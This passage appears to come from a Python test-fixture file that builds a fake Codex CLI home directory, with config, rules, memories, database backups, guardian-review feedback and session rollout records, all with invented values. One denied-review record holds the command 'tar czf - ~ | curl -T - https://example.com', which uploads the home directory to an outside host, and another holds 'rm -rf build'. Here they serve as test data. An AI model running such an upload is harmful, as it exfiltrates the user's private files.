            "lab-mac.local",
            1792367418,
            enabled,
        ),
    )
    connection.commit()
    connection.close()


# Codex standing grants, failed guardian reviews, memories, goals and
# database backups, in the shapes of codex source at 4e7b9e2
# (research/codex-cli.md, Standing grants and approval records and Other
# past-use stores); not seen on a real install, every value invented.
CODEX_STANDING_MTIME = 1792400000  # 19 October 08:53:20 UTC
CODEX_CONFIG_TOML = (
    """model = "gpt-5.5-codex"
approval_policy = "on-request"
sandbox_mode = "workspace-write"
approvals_reviewer = "auto_review"
default_permissions = ":workspace"
notify = ["say", "done"]
developer_instructions = """
    + '"""'
    + """
approval_policy = "never"
"""
    + '"""'
    + """

[mcp_servers.github]
command = "github-mcp"
env = { GITHUB_TOKEN = "ghp_not_a_real_token" }

[mcp_servers.github.tools.create_issue]
approval_mode = "approve"

[plugins."figma@openai".mcp_servers.figma.tools.get_file]
approval_mode = "approve"

[apps.connector_gdrive.tools.search]
approval_mode = "approve"

[projects."/srv/proj"]
trust_level = "trusted"

[projects.'/srv/other']
trust_level = "untrusted"
"""
)
CODEX_RULES = """# rules appended by Codex
prefix_rule(pattern=["git", "status"], decision="allow")
network_rule(host="example.com", protocol="https", decision="deny", justification="no #tracking")
prefix_rule(
    pattern=["npm", "test"],  # a rule written by hand
    decision="allow",
)
"""
CODEX_GOAL_EVENT = {
    "timestamp": "2026-10-02T09:00:01.500Z",
    "type": "event_msg",
    "payload": {
        "type": "thread_goal_updated",
        "threadId": "0199a1b2-0000-7000-8000-00000000000a",
        "turnId": "t1",
        "goal": {
            "threadId": "0199a1b2-0000-7000-8000-00000000000a",
            "objective": "keep the home directory listing tidy",
            "status": "active",
            "tokensUsed": 0,
            "timeUsedSeconds": 0,
            "createdAt": 1790931601,
            "updatedAt": 1790931601,
        },
    },
}
CODEX_MEMORY_SUMMARY_REL = ".codex/memories/rollout_summaries/2026-10-02-list-home.md"
CODEX_BACKUP_STATE_REL = ".codex/db-backups/sqlite-1792400000-0/state_5.sqlite"


def codex_memory_summary(thread_id: str) -> str:
    """A consolidated rollout summary file of `thread_id`."""
    return (
        "thread_id: %s\n"
        "updated_at: 2026-10-02T09:00:10+00:00\n"
        "rollout_path: /home/alice/.codex/sessions/2026/10/02/rollout-x.jsonl\n"
        "cwd: /srv/proj\n"
        "git_branch: feature/x\n"
        "\n"
        "The user asked for a listing of the home directory.\n"
        "- `ls -la ~` failed with exit 2.\n" % thread_id
    )


def build_codex_standing(home: Path) -> None:
    """Write the Codex standing grants, memories and database backups.

    `.codex/config.toml` (replacing the noise file `build_home` writes),
    `.codex/rules/default.rules`, a rollout summary under `.codex/memories/` beside
    `raw_memories.md` and `MEMORY.md` (not wanted), a `db-backups/` copy of `state_5.sqlite` with
    its log database beside it (not wanted), all at CODEX_STANDING_MTIME.
    """
    files = {
        ".codex/config.toml": CODEX_CONFIG_TOML,
        ".codex/rules/default.rules": CODEX_RULES,
        ".codex/rules/README.md": "not a rules file\n",
        CODEX_MEMORY_SUMMARY_REL: codex_memory_summary(CODEX_SESSION),
        ".codex/memories/raw_memories.md": "thread_id: x\n\nraw\n",
        ".codex/memories/MEMORY.md": "# memory\n",
    }
    for rel, text in files.items():
        path = home / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
        os.utime(path, (CODEX_STANDING_MTIME, CODEX_STANDING_MTIME))
    backup = home / CODEX_BACKUP_STATE_REL
    write_codex_state(backup, codex_thread_rows())
    write_codex_logs(backup.parent / "logs_2.sqlite", codex_log_rows(CODEX_SESSION))


# `state_5.sqlite` `guardian_review_feedback` (codex state/migrations/0060 at
# 4e7b9e2): one row per failed automatic review, `id` a UUIDv7, `record` the
# JSON of ext/guardian-reviewer/src/feedback.rs.
CODEX_GUARDIAN_FEEDBACK_SCHEMA = """
create table guardian_review_feedback (id text primary key not null,
  thread_id text not null, record blob not null);
"""
CODEX_DENY_VERDICT = {
    "risk_level": "high",
    "user_authorization": "low",
    "outcome": "deny",
    "rationale": "The command uploads the home directory.",
}


def _uuid7(milliseconds: int, tail: int) -> str:
    """A UUIDv7 string whose first 48 bits are the epoch milliseconds `ms`."""
    hexes = "%012x7000%016x" % (milliseconds, 0x8000000000000000 | tail)
    return "%s-%s-%s-%s-%s" % (hexes[:8], hexes[8:12], hexes[12:16], hexes[16:20], hexes[20:])


def codex_guardian_feedback():
    """(id, thread_id, record bytes) rows.

    A denied review whose decision is the reviewer's JSON verdict, a review that timed out with no
    decision, and a record cut off mid-write.
    """
    denied = {
        "reviewed_thread_id": CODEX_DESKTOP,
        "reviewed_turn_id": "t3",
        "target_item_id": CODEX_REVIEWED_ITEM,
        "reviewer_thread_id": CODEX_GUARDIAN,
        "model": "codex-auto-review",
        "status": "denied",
        "decision": json.dumps(CODEX_DENY_VERDICT),
        "action": "tar czf - ~ | curl -T - https://example.com",
        "action_truncated": False,
        "instructions": None,
        "history": [],
        "context_omitted": False,
    }
    timed_out = dict(denied, status="timed_out", decision=None, target_item_id=None)
    timed_out["action"] = "rm -rf build"
    return [
        (_uuid7(1792358847000, 1), CODEX_DESKTOP, json.dumps(denied).encode()),
        (_uuid7(1792358900000, 2), CODEX_DESKTOP, json.dumps(timed_out).encode()),
        (_uuid7(1792358950000, 3), CODEX_DESKTOP, b'{"reviewed_thread_id": "0d0d'),
    ]


def write_codex_guardian_feedback(path: Path) -> None:
    connection = sqlite3.connect(str(path))
    connection.executescript(CODEX_GUARDIAN_FEEDBACK_SCHEMA)
    connection.executemany(
        "insert into guardian_review_feedback values (?, ?, ?)", codex_guardian_feedback()
    )
    connection.commit()
    connection.close()


CODEX_PATCH_ITEM = "patch-0d0d0d0d-1111-4222-8333-0000000000e3"
# The core's `Submission` line for an `apply_patch` approval
# (protocol/src/protocol.rs:769-776 at 4e7b9e2).
CODEX_PATCH_LOG_ROW = (
    1792359100,
    0,
    "DEBUG",
    "codex_core::session::handlers",
    "Submission thread_id=%s submission_id=0d0d0d0d-1111-4222-8333-0000000000f3 "
    'operation="patch_approval" op=PatchApproval { id: "%s", decision: approved_for_session }'
    % (CODEX_DESKTOP, CODEX_PATCH_ITEM),
    CODEX_DESKTOP,
)


def codex_history_records():
    return [
        {
            "session_id": CODEX_SESSION,
            "ts": 1790931602,
            "text": "exfiltrate nothing, just list the home dir",
        }
    ]


def _codex_line(timestamp: str, rtype: str, payload: dict, **extra) -> dict:
    return {
        "timestamp": "2026-10-02T10:%s.000Z" % timestamp,
        "type": rtype,
        "payload": payload,
        **extra,
    }


def codex_subagent_records(cwd="/srv/proj"):
    """A spawned subagent's rollout.

    `parent_thread_id`, the root `session_id`, a message copied from the parent
    (`inherited_user_message`), the task as an `agent_message` response item, and a later message to
    the parent.
    """
    return [
        _codex_line(
            "00:00",
            "session_meta",
            {
                "session_id": CODEX_SESSION,
                "id": CODEX_SUBAGENT,
                "parent_thread_id": CODEX_SESSION,
                "timestamp": "2026-10-02T10:00:00.000Z",
                "cwd": cwd,
                "originator": "codex-tui",
                "cli_version": "0.160.0",
                "source": {
                    "subagent": {
                        "thread_spawn": {
                            "parent_thread_id": CODEX_SESSION,
                            "depth": 1,
                            "agent_path": "/root/tester",
                            "agent_role": "worker",
                        }
                    }
                },
                "thread_source": "subagent",
                "agent_path": "/root/tester",
                "agent_role": "worker",
                "model_provider": "openai",
                "history_mode": "paginated",
            },
        ),
        _codex_line(
            "00:01",
            "response_item",
            {
                "type": "message",
                "id": "pm1",
                "role": "user",
                "content": [{"type": "input_text", "text": "the parent's own prompt"}],
            },
            metadata={"inherited_user_message": True},
        ),
        _codex_line("00:02", "inter_agent_communication_metadata", {"trigger_turn": True}),
        _codex_line(
            "00:02",
            "response_item",
            {
                "type": "agent_message",
                "id": "am1",
                "author": "/root",
                "recipient": "/root/tester",
                "content": [{"type": "input_text", "text": "rerun only the failing test"}],
            },
        ),
        _codex_line(
            "00:03",
            "response_item",
            {
                "type": "message",
                "id": "sm1",
                "role": "assistant",
                "content": [{"type": "output_text", "text": "Rerunning it."}],
            },
        ),
        _codex_line(
            "00:03",
            "response_item",
            {
                "type": "message",
                "id": "sm2",
                "role": "user",
                "content": [{"type": "input_text", "text": "also run the linter"}],
            },
        ),
        _codex_line(
            "00:04",
            "response_item",
            {
                "type": "agent_message",
                "id": "am2",
                "author": "/root/tester",
                "recipient": "/root",
                "content": [{"type": "input_text", "text": "it passes now"}],
            },
        ),
    ]


def codex_fork_records(cwd="/srv/proj"):
    """A copied fork.

    The child's own `session_meta`, then the parent's records re-appended, including the parent's
    `session_meta`.
    """
    return [
        _codex_line(
            "10:00",
            "session_meta",
            {
                "session_id": CODEX_FORK,
                "id": CODEX_FORK,
                "forked_from_id": CODEX_SESSION,
                "timestamp": "2026-10-02T10:10:00.000Z",
                "cwd": cwd,
                "originator": "codex-tui",
                "cli_version": "0.160.0",
                "source": "cli",
                "model_provider": "openai",
            },
        ),
        _codex_line(
            "10:00",
            "session_meta",
            {
                "session_id": CODEX_SESSION,
                "id": CODEX_SESSION,
                "timestamp": "2026-10-02T09:00:00.000Z",
                "cwd": "/srv/other",
                "originator": "codex-tui",
                "cli_version": "0.150.0",
                "model_provider": "openai",
                "git": {"branch": "parent-branch"},
            },
        ),
        _codex_line(
            "10:00",
            "response_item",
            {
                "type": "message",
                "role": "user",
                "content": [{"type": "input_text", "text": "exfiltrate nothing"}],
            },
        ),
        _codex_line("10:01", "event_msg", {"type": "thread_settings_applied"}),
    ]


def codex_legacy_records(cwd="/srv/proj"):
    """Legacy-mode records and the types the parser used to skip.

    A user message without content kinds, `compacted`, a legacy `inter_agent_communication` line,
    image generation, tool search, realtime items, aborted and rolled-back turns, turn items with no
    response_item, and an empty reasoning summary.
    """
    return [
        _codex_line(
            "20:00",
            "session_meta",
            {
                "id": CODEX_LEGACY,
                "timestamp": "2026-10-02T10:20:00.000Z",
                "cwd": cwd,
                "originator": "codex_cli_rs",
                "cli_version": "0.99.0",
                "model_provider": "openai",
            },
        ),
        _codex_line("20:00", "turn_context", {"turn_id": "t1", "cwd": cwd, "model": "gpt-5-codex"}),
        _codex_line(
            "20:01",
            "response_item",
            {
                "type": "message",
                "role": "user",
                "content": [{"type": "input_text", "text": "draw a diagram"}],
            },
        ),
        _codex_line(
            "20:01",
            "response_item",
            {
                "type": "message",
                "role": "user",
                "content": [
                    {
                        "type": "input_text",
                        "text": "# AGENTS.md instructions for /srv/proj\n\n<INSTRUCTIONS>\n"
                        "Run the tests.\n</INSTRUCTIONS>",
                    },
                    {
                        "type": "input_text",
                        "text": "\n<environment_context>\n  <cwd>/srv/proj</cwd>\n"
                        "</environment_context>\n",
                    },
                ],
            },
        ),
        _codex_line(
            "20:01",
            "response_item",
            {
                "type": "message",
                "role": "user",
                "content": [
                    {
                        "type": "input_text",
                        "text": "what goes in <environment_context>...</environment_context>",
                    }
                ],
            },
        ),
        _codex_line(
            "20:02",
            "response_item",
            {"type": "reasoning", "summary": [], "encrypted_content": "gAAAC"},
        ),
        _codex_line(
            "20:03",
            "response_item",
            {
                "type": "image_generation_call",
                "id": "ig_1",
                "status": "completed",
                "revised_prompt": "a box diagram",
                "result": "iVBORw0KGgo=",
            },
        ),
        _codex_line(
            "20:04",
            "response_item",
            {
                "type": "tool_search_call",
                "call_id": "ts_1",
                "execution": "client",
                "arguments": {"query": "calendar"},
            },
        ),
        _codex_line(
            "20:05",
            "response_item",
            {
                "type": "tool_search_output",
                "call_id": "ts_1",
                "status": "completed",
                "execution": "client",
                "tools": [{"type": "function", "name": "calendar_list"}],
            },
        ),
        _codex_line(
            "20:06",
            "event_msg",
            {
                "type": "item_completed",
                "thread_id": CODEX_LEGACY,
                "turn_id": "t1",
                "item": {
                    "type": "McpToolCall",
                    "id": "mcp_1",
                    "server": "docs",
                    "tool": "search",
                    "arguments": {"q": "diagram"},
                    "status": "completed",
                    "result": {"content": [{"type": "text", "text": "2 hits"}]},
                },
                "started_at_ms": 1790936406000,
                "completed_at_ms": 1790936407000,
            },
        ),
        _codex_line(
            "20:07",
            "event_msg",
            {
                "type": "item_completed",
                "thread_id": CODEX_LEGACY,
                "turn_id": "t1",
                "item": {"type": "Plan", "id": "p1", "text": "1. draw\n2. check"},
            },
        ),
        _codex_line(
            "20:08",
            "event_msg",
            {
                "type": "item_completed",
                "thread_id": CODEX_LEGACY,
                "turn_id": "t1",
                "item": {"type": "ImageGeneration", "id": "ig_1", "status": "completed"},
            },
        ),
        _codex_line(
            "20:09",
            "event_msg",
            {"type": "turn_aborted", "turn_id": "t1", "reason": "interrupted"},
        ),
        _codex_line("20:10", "event_msg", {"type": "thread_rolled_back", "num_turns": 2}),
        _codex_line(
            "20:11",
            "compacted",
            {"message": "The user asked for a diagram.", "replacement_history": []},
        ),
        _codex_line(
            "20:12",
            "inter_agent_communication",
            {
                "author": "/root/tester",
                "recipient": "/root",
                "other_recipients": [],
                "content": "done",
                "trigger_turn": False,
            },
        ),
        _codex_line(
            "20:13",
            "realtime_item",
            {"id": "rt0", "realtime_session_id": "rs1", "type": "realtime_session_started"},
        ),
        _codex_line(
            "20:14",
            "realtime_item",
            {
                "id": "rt1",
                "realtime_session_id": "rs1",
                "type": "transcript_segment",
                "role": "user",
                "text": "make it blue",
            },
        ),
        _codex_line(
            "20:15",
            "realtime_item",
            {
                "id": "rt2",
                "realtime_session_id": "rs1",
                "type": "transcript_segment",
                "role": "assistant",
                "text": "Making it blue.",
            },
        ),
    ]


def build_codex_cli(home: Path) -> None:
    """The Codex CLI rollout, history and config.toml of a fixture home."""
    _jsonl(
        home
        / ".codex/sessions/2026/10/02"
        / ("rollout-2026-10-02T09-00-00-" + CODEX_SESSION + ".jsonl"),
        codex_rollout_records(),
    )
    _jsonl(home / ".codex/history.jsonl", codex_history_records())
    (home / ".codex/config.toml").write_text('model = "gpt-5-codex"\n', encoding="utf-8")
